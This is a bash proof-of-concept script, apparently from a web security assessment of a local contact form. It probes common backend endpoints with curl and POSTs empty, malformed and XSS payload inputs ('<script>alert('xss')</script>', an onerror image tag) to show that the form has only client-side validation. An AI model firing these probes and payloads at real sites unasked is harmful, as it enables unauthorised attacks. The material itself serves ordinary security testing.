#!/bin/bash

# POC: Client-Side Only Form Validation Bypass
# Demonstrates that the contact form has no server-side validation or processing

TARGET="http://localhost:8080"
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}=== Client-Side Only Validation Bypass POC ===${NC}\n"

# Test 1: Check if common backend endpoints exist
echo -e "${YELLOW}[Test 1] Checking for backend form processing endpoints...${NC}"
echo ""

endpoints=(
    "/contact.php"
    "/submit.php"
    "/api/contact"
    "/api/submit"
    "/contact"
    "/submit"
    "/form/contact"
)

backend_exists=false
for endpoint in "${endpoints[@]}"; do
    echo -e "Testing: ${TARGET}${endpoint}"
    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${TARGET}${endpoint}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "name=test&email=test@test.com&message=test" \
        --max-time 3)
    
    if [ "$response" != "404" ] && [ "$response" != "000" ]; then
        echo -e "${RED}  → Backend exists: HTTP $response${NC}"
        backend_exists=true
    else
        echo -e "${GREEN}  → No backend: HTTP $response${NC}"
    fi
done

echo ""

# Test 2: Verify the form exists on the page
echo -e "${YELLOW}[Test 2] Verifying contact form exists in HTML...${NC}"
html_content=$(curl -s "$TARGET")

if echo "$html_content" | grep -q "contact-form"; then
    echo -e "${GREEN}✓ Contact form found in HTML${NC}"
    
    # Check for validation attributes
    if echo "$html_content" | grep -q 'required'; then
        echo -e "${GREEN}✓ Client-side 'required' attributes detected${NC}"
    fi
    
    if echo "$html_content" | grep -q 'type="email"'; then
        echo -e "${GREEN}✓ Client-side email type validation detected${NC}"
    fi
    
    # Check for form action
    if echo "$html_content" | grep -q '<form[^>]*action='; then
        form_action=$(echo "$html_content" | grep -o '<form[^>]*action="[^"]*"' | head -1)
        echo -e "${BLUE}ℹ Form action attribute: $form_action${NC}"
    else
        echo -e "${RED}✗ No form action attribute - form doesn't submit to server${NC}"
    fi
else
    echo -e "${RED}✗ Contact form not found${NC}"
fi

echo ""

# Test 3: Try to bypass validation with invalid/empty data
echo -e "${YELLOW}[Test 3] Attempting to bypass validation with invalid data...${NC}"
echo ""

# Test with empty fields (should be blocked by server-side validation)
echo -e "Sending empty fields:"
response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${TARGET}/contact.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "name=&email=&message=" \
    --max-time 3)
echo -e "  → HTTP Response: $response (404 = no backend)"

# Test with invalid email (should be blocked by server-side validation)
echo -e "\nSending invalid email format:"
response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${TARGET}/contact.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "name=attacker&email=not-an-email&message=test" \
    --max-time 3)
echo -e "  → HTTP Response: $response (404 = no backend)"

# Test with malicious payload (should be sanitized by server-side)
echo -e "\nSending potential XSS payload:"
response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${TARGET}/contact.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "name=<script>alert('xss')</script>&email=test@test.com&message=<img src=x onerror=alert(1)>" \
    --max-time 3)
echo -e "  → HTTP Response: $response (404 = no backend)"

echo ""

# Summary
echo -e "${BLUE}=== POC SUMMARY ===${NC}"
echo ""

if [ "$backend_exists" = false ]; then
    echo -e "${RED}[VULNERABILITY CONFIRMED]${NC}"
    echo ""
    echo -e "The contact form implements ${RED}ONLY CLIENT-SIDE VALIDATION${NC}:"
    echo -e "  • Form has HTML5 validation attributes (required, type='email')"
    echo -e "  • No backend endpoint exists to process form submissions"
    echo -e "  • Form submission is handled purely by JavaScript"
    echo -e "  • All tested endpoints returned HTTP 404"
    echo ""
    echo -e "${YELLOW}Impact:${NC}"
    echo -e "  • Client-side validation can be bypassed (disable JS, dev tools)"
    echo -e "  • No actual server-side processing occurs"
    echo -e "  • Users receive false confirmation that messages were sent"
    echo -e "  • No data validation, sanitization, or storage"
    echo -e "  • If backend added later without validation, immediately exploitable"
else
    echo -e "${GREEN}[BACKEND EXISTS]${NC}"
    echo -e "A backend endpoint was found - server-side validation may be present."
fi

echo ""